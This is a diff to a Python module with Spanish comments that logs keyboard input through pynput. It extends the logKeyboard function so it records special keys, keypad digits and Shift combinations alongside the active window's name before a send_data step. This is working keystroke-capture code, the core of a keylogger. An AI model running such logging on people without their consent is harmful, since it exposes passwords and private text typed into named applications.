@@ -81,19 +81,48 @@ def logMouse():
 # Funciones Auxiliares para Log Keyboard
 # -----------------------------------------------------------------------------
 
+# Mapeo de teclas especiales a sus nombres
+special_keys = {
+    pynput_keyboard.Key.enter: 'ENTER',
+    pynput_keyboard.Key.backspace: 'BACKSPACE',
+    pynput_keyboard.Key.space: 'SPACE',
+    pynput_keyboard.Key.insert: 'INSERT',
+    pynput_keyboard.Key.tab: 'TAB',
+    pynput_keyboard.Key.caps_lock: 'BLOQ_MAYÚS',
+    pynput_keyboard.Key.right: 'RIGHT_ARROW',
+    pynput_keyboard.Key.down: 'DOWN_ARROW',
+    pynput_keyboard.Key.left: 'LEFT_ARROW',
+    pynput_keyboard.Key.up: 'UP_ARROW',
+    pynput_keyboard.Key.delete: 'DELETE',
+    pynput_keyboard.Key.end: 'FIN',
+    pynput_keyboard.Key.page_down: 'PAGE_DOWN',
+    pynput_keyboard.Key.home: 'HOME',
+    pynput_keyboard.Key.page_up: 'PAGE_UP',
+    pynput_keyboard.Key.print_screen: 'IMPR_PANT',
+    pynput_keyboard.Key.scroll_lock: 'BLOQ_DESPL',
+    pynput_keyboard.Key.pause: 'PAUSA_INTER',
+    pynput_keyboard.Key.esc: 'ESCAPE',
+        # Agrega aquí otras teclas especiales si es necesario
+    }
 
 def get_key_str(key):
-    # Condición para verificar si la tecla es una tecla de función
-    if isinstance(key, pynput_keyboard.Key) and 'f' in str(key):
-        return str(key).upper().replace("_", " ")  # Convertir a cadena y formatear correctamente
+    # Condición para verificar si la tecla es una tecla especial
+    if key in special_keys:
+        return special_keys[key]
+
+    # Condición para teclas de función y otras teclas especiales
+    if isinstance(key, pynput_keyboard.Key):
+        return str(key).upper().replace("KEY.", "")
     elif hasattr(key, 'char') and key.char:
         return key.char  # Retornar el carácter de la tecla si existe
     elif hasattr(key, 'vk'):
         if 47 < key.vk < 58:  # valores vk para las teclas numéricas 0-9
             return str(key.vk - 48)  # Convertir el valor vk al número actual
+        elif 95 < key.vk < 106:  # valores vk para las teclas numéricas del teclado numérico 0-9
+            return str(key.vk - 96)  # Convertir el valor vk al número actual
         elif 64 < key.vk < 91:  # valores vk para las teclas de letras A-Z
             return chr(key.vk)  # Convertir el valor vk a la letra actual
-    return str(key)[1:-1]  # Retornar la representación de la tecla como cadena sin los corchetes angulares
+    return str(key)  # Retornar la representación de la tecla como cadena sin los corchetes angulares
 
 
 # Mapeo de caracteres de control a combinaciones de teclas
@@ -104,7 +133,6 @@ control_char_mapping = {
 def translate_control_chars(char_sequence):
     return ' '.join(control_char_mapping.get(char, char) for char in char_sequence)
 
-
 # -----------------------------------------------------------------------------
 # Función principal Log Keyboard
 # -----------------------------------------------------------------------------
@@ -114,18 +142,29 @@ def logKeyboard():
     pressed_keys = []
     last_key_time = time()
     timer = None
+    
+    def is_special_or_space(key_str):
+            return key_str in special_keys.values() or key_str == 'SPACE'
 
     def send_data():
         nonlocal pressed_keys
         if pressed_keys:
             window_name = getActiveWindowInfo("name")
-            typed_word = ''.join([k for k in pressed_keys if k])  # Filtrar cualquier valor None
+
+            # Construye la secuencia de teclas presionadas
+            typed_sequence = []
+            for i, key in enumerate(pressed_keys):
+                if i > 0 and (is_special_or_space(pressed_keys[i - 1]) or is_special_or_space(key)):
+                    typed_sequence.append('+')
+                typed_sequence.append(key)
+
+            typed_word = ''.join(typed_sequence)
 
             # Verificar si 'C T R L + ' ya está en typed_word
             if 'C T R L   +   ' not in typed_word:
                 if any(c in control_char_mapping for c in typed_word):
                     typed_word = translate_control_chars(typed_word)  # Traducir caracteres de control solo si es necesario
-
+  
             # Corregir la secuencia incorrecta
             incorrect_sequence = 'C T R L   +   '
             if typed_word.startswith(incorrect_sequence):
@@ -145,7 +184,7 @@ def logKeyboard():
             pressed_keys = []  # Limpiar pressed_keys
 
 
-    modifier_state = {'alt': False, 'ctrl': False, 'win': False}  # Variables de estado de teclas
+    modifier_state = {'alt': False, 'ctrl': False, 'win': False, 'shift': False}  # Variables de estado de teclas
 
     def on_press(key):
         nonlocal last_key_time, pressed_keys, timer
@@ -156,6 +195,8 @@ def logKeyboard():
             modifier_state['ctrl'] = True
         elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
             modifier_state['win'] = True
+        elif key in {pynput_keyboard.Key.shift_l, pynput_keyboard.Key.shift_r}:
+            modifier_state['shift'] = True
         else:
             key_char = get_key_str(key)
             
@@ -179,6 +220,8 @@ def logKeyboard():
                     hotkey_str += 'ALT + '
                 if modifier_state['win']:
                     hotkey_str += 'WIN + '
+                if modifier_state['shift']:
+                    hotkey_str += 'SHIFT + '
 
                 hotkey_str += key_char
                 pressed_keys.append(hotkey_str)
@@ -201,11 +244,11 @@ def logKeyboard():
             modifier_state['ctrl'] = False
         elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
             modifier_state['win'] = False
+        elif key in {pynput_keyboard.Key.shift_l, pynput_keyboard.Key.shift_r}:
+            modifier_state['shift'] = False
 
     # Ejecuta la función correspondiente al pulsar una tecla
     with pynput_keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-
-
 
 
